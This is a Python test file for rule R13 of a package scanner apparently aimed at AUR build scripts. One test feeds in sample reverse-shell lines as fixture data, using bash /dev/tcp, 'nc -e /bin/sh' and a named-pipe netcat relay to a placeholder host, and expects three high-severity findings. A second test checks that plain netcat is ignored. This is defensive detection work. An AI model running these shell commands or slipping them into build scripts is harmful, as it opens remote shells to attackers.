"""Per-rule tests for R13."""

from __future__ import annotations

from aurscan.models import Severity
from tests.rules_utils import by_rule, run_rules


def test_r13_flags_raw_sockets_netcat_exec_and_fifo() -> None:
    source = """\
build() {
  bash -i >& /dev/tcp/example.invalid/4444 0>&1
  nc -e /bin/sh example.invalid 4444
  mkfifo /tmp/aurscan-fifo
  nc example.invalid 4445 < /tmp/aurscan-fifo
}
"""
    findings = by_rule(run_rules(source), "R13")

    assert len(findings) == 3
    assert all(finding.severity == Severity.HIGH for finding in findings)


def test_r13_ignores_ordinary_netcat_without_fifo_or_exec() -> None:
    source = """\
build() {
  nc example.invalid 80 < payload
}
"""
    assert by_rule(run_rules(source), "R13") == []
